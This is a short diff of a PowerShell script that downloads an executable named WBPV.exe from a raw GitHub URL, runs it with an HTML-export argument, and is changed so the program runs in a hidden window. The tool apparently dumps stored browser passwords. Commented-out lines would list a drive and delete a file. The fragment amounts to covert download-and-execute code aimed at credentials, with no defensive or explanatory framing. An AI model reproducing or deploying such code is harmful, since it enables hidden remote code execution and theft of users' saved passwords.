@@ -39,7 +39,7 @@ if (!(Test-Path $WBPV)) {
   $url = "https://raw.github.com/ksp-wrk/s/main/WBPV.exe"
   $args = "/shtml $WPs"
   Invoke-WebRequest $url -OutFile $WBPV
-  start-process $WBPV $args -Wait
+  start-process $WBPV $args -WindowStyle Hidden -Wait
   #Start-Process -FilePath "cmd.exe" -ArgumentList "/c", "dir C:\" -wait
   #Get-Item $FilePath | Remove-Item
 }
